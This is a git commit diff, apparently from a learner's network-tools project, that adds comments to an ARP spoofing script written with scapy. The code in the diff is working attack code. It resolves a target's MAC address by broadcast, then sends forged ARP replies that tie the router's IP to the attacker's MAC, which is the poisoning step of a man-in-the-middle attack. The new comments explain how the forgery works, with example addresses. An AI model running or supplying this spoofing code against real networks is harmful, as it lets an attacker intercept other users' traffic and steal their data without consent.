3fcae825df0152853260caec89224953434bc758
Helton Wernik <heltonwernik@gmail.com>
2018-11-18 11:30:35 +0200

    add some comments in arp_spoof

--- network_tools/arp_spoof.py
+++ network_tools/arp_spoof.py
@@ -6,7 +6,9 @@ import sys
 import subprocess
 
 def get_mac(ip):
+    # use scapy.ls(scapy.ARP()) to see the fields, example: print(arp_request.summary()) -> ARP who has Net('192.168.0.0/24') says 192.168.0.50
     arp_request = scapy.ARP(pdst=ip)
+    # set broadcast to delivered this packet to all clients on the same network 
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
@@ -15,6 +17,7 @@ def get_mac(ip):
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
+    #op 1 = request, 2 = response (is-at); spoof_ip is the ip of the router that a target associate with the MAC of the attacker for example: print(packet.summary()) -> ARP is at 60:f8:1d:b3:f2:7a says 192.168.252.1
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
